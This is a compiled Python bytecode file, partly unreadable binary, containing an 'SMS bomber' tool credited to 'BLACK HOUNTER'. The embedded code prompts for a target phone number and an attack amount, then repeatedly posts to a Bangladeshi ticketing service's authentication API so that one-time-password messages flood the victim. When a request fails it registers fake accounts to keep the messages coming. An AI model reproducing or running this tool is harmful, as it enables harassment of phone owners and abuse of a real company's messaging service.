o
    ���b�
  �                   @   s"  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeee	d e
 ��Zeee	d e ��Ze �d� eed � e�d�Zee	d � ee	d � eed e	 d e d � e�d� ee	de�� d � eed � eed � d dlZd dlZd dlZd dlZd dlZd dlmZ d dlZd dlZd dlmZ d dlZej�� Zee	dej� de�ed �� d ej � d!e�e
d" �� � � ed#e�d$�� d%e�ed& �� d%e�ed' �� d(e�e	d) �� �� d*d+� Z!e!�  dS ),�    N�clearzlolcat ban.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   g{�G�z�?)�sys�stdout�write�flush�time�sleep)ZJonYZword� r
   �03.py�	logoprint   s
   
�r   z    Enter Target Number: z    Enter Attack Amount: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : BLACK HOUNTERz	 VERSION 	  : 2.2u   	 ♥♥z	 BLACK HOUNTER�   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictzDate : z - z%B�-z, z%AzTime: z%I�:z%Mz%S� z%pc                  C   s  d} t � }d|d< dt d }tt�D ]n}z
tj| ||d�aW n   td� Y t�� d d	krKt	t
|d
 g�t tj t d t t t d � qt�� d dkrxd} t � }d|d< dt d }tj| ||d�}t|j� t�d� t�  qtd� ttj� qd S )Nz'https://api.bdtickets.com:20100/v1/authzapplication/jsonzContent-Typez{"phoneNumber":"+88z"})�headers�datazFOUND A ERROR�messageZOTP_GENERATED�   z 
tAttack Number z FaHaD SiiR PiiN SenT HoYecHe
ZREQUEST_FAILEDz'https://api.bdtickets.com:20100/v1/userzq","firstName":"Altra","givenName":"Devil","email":"mrDevil@gmail.com","locale":"EN","sendOtp":true,"debug":false}r   zOTP NOT SENT)r   �number�range�amount�requestsZpost�kill�print�jsonr   �str�bired�text�biblue�bigreen�biyellow�os�system�sentOtp)Zurlr   r   �iZrespr
   r
   r   r%   K   s.   
6

�r%   )"r#   r$   r   Zasyncior   r   r   Zbiblackr   r!   r"   r    ZbipurpleZbicyanZbiehiter   r   �inputr   �intr   �getZresponser	   r   Zrequests.structuresr   ZdatetimeZnow�xZday�strftimeZyearr%   r
   r
   r
   r   �<module>   sT    





<D
 